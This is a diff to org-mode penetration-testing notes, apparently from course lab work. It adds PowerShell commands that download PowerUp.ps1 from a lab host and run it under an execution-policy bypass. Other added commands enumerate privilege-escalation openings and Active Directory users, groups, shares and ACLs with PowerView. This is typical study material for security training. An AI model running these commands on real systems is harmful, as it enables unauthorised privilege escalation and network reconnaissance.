@@ -883,10 +883,28 @@ http://localhost:7474/browser/
    #+end_example
    
    --------------------
-
+Powerup
+#+begin_example
+PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+PS C:\Users\dave> powershell -ep bypass
+...
+PS C:\Users\dave> . .\PowerUp.ps1
+PS C:\Users\dave> Get-UnquotedService
+PS C:\Users\dave> Get-ModifiableServiceFile
+PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
+PS C:\Tools> Find-DomainShare
+ #+end_example
    *PowerView*
-
-   TODO
+#+begin_example
+Import-Module .\PowerView.ps1
+PS C:\Tools> Get-NetUser
+PS C:\Tools> Get-NetUser | select cn
+PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon
+PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+PS C:\Tools> Get-NetGroup "Management Department" | select member
+PS C:\Tools> Get-ObjectAcl -Identity stephanie
+ #+end_example
+  
    
 * Exploitation
 
